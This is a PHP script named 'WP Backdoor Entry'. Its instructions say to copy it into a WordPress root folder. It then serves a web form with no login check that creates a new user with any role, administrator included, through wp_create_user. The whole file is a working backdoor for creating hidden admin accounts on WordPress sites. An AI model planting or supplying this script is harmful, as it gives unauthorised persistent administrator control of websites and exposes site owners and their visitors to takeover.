<?php
  /*

  Script Name: WP Backdoor Entry
  
  Description: A script to create a new user with any given role.
  
  Usage: Copy this file into your WordPress root folder and execute the script via the browser.

  */

  $wp_folder  = '';
  $username   = '';
  $email      = '';
  $password   = '';
  $role       = '';
 
  if (isset($_POST['name'])){
    $username  = htmlentities($_POST['name']);
  }
  if (isset($_POST['email'])){
    $email     = htmlentities($_POST['email']);
  }
  if (isset($_POST['password'])){
    $password  = htmlentities($_POST['password']);
  }
  if (isset($_POST['role'])){
    $role     = htmlentities($_POST['role']);
  }

  // Check if there is WordPress folder defined
  if( ! empty( $wp_folder ) ) {
    $wp_load_path = $wp_folder .'/wp-load.php';
  } else {
    $wp_load_path = 'wp-load.php';
  }

  // Verify if wp-load.php is exist
  if ( ! file_exists($wp_load_path)) {
      echo "ERROR! wp-load.php does not exist!";
      echo '<br>';
      exit;
  }
    
    function vc_create_administrator($username, $password, $email, $role, $wp_load_path) {
    
      include($wp_load_path);
      
      if ( ! username_exists($username) && ! email_exists( $email )) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role( $role );
        
      } else {
        echo 'ERROR! The username or email is already exists!';
        echo '<br>';
        exit;
      }

      if ( ! empty($username)) {
        header("Location: /wp-login.php");
        exit;
      }
    }

    vc_create_administrator($username, $password, $email, $role, $wp_load_path);
    add_action('init','vc_create_administrator');
    
?>

<!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Generator</title>
  </head>
  <body>
    <div class="container">
      <form method ="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
        <div>
          <label for="">Username</label><br>
          <input type="" name="name">
        </div>
        <div>
          <label for="">Email</label><br>
          <input type="" name="email">
        </div>
        <div>
          <label for="">Password</label><br>
          <input type="password" name="password">
        </div>
        <label for="">Set a role for this user:</label>
          <select name="role">
            <option value="administrator">Administrator</option>
            <option value="subscriber">Subscriber</option>
            <option value="contributor">Contributor</option>
            <option value="author">Author</option>
            <option value="editor">Editor</option>
          </select>
        <br>
        <input type="submit" value="Submit">
      </form>
    </div>
  </body>
</html>